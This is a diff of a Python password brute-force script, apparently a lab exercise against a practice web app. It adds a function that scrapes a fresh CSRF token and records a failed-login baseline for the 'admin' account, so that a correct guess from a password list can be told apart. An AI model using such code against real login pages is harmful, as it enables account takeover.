@@ -25,7 +25,6 @@ passwords = [
 ]
 
 session = requests.Session()
-session.cookies.update(COOKIES)
 
 # Attempt analysis showed that CSRF token is refresh at each request
 # Each new attempt should get a new token
@@ -34,6 +33,27 @@ def get_token():
     soup = BeautifulSoup(r.text, "html.parser")
     token = soup.find("input", {"name": "user_token"})["value"]
     return token
+
+# We check the baseline payload output in order to understand what is the incorrect case
+def get_baseline():
+    token = get_token()
+
+    params = {
+        "username": "admin",
+        "password": "senha_errada_123",
+        "Login": "Login",
+        "user_token": token
+    }
+
+    r = session.get(LOGIN_PAGE, params=params)
+    
+    return {
+        "length": len(r.text),
+        "status": r.status_code
+    }
+
+baseline = get_baseline()
+print(f"[i] Baseline: {baseline}")
 
 
 def try_login(password):
